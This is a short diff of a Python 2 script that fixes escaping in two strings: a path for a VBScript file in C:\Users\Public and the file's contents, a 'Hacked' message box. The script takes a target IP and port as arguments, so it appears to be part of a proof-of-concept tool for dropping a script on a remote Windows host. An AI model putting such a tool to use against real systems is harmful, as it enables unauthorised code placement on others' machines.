@@ -2,8 +2,8 @@
 import urllib2
 import sys
 
-file_path = "C:\Users\Public\script.vbs"
-file_code = 'MsgBox("Hacked")'
+file_path = r'C:\\Users\\Public\\script.vbs'
+file_code = r'MsgBox("Hacked")'
 
 ip = sys.argv[1]
 port = sys.argv[2]
